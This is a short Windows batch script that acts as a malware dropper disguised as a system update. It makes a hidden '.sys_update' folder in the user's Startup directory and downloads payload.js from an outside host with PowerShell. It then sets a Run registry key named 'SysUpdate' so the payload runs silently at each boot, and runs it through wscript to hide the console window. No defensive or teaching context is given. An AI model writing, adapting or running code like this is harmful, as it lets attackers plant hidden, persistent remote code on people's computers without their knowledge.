@echo off
:: Check if already installed in AppData
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.sys_update\payload.js" goto :END

:: Create hidden directory
set DIR="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.sys_update"
mkdir %DIR% 2>nul

:: Download the latest payload from Vercel/GitHub (Replace URL below)
powershell -Command "Invoke-WebRequest -Uri 'https://payload-x3rf.onrender.com/payload.js' -OutFile '%DIR%\payload.js'"

:: Add Registry Persistence (Runs silently on boot)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "wscript.exe //nologo //e:jscript \"%DIR%\payload.js\"" /f

:: Execute the payload using WScript (Hides the black console window)
%SYSTEMROOT%\System32\wscript.exe //nologo //e:jscript "%DIR%\payload.js"

:END
exit
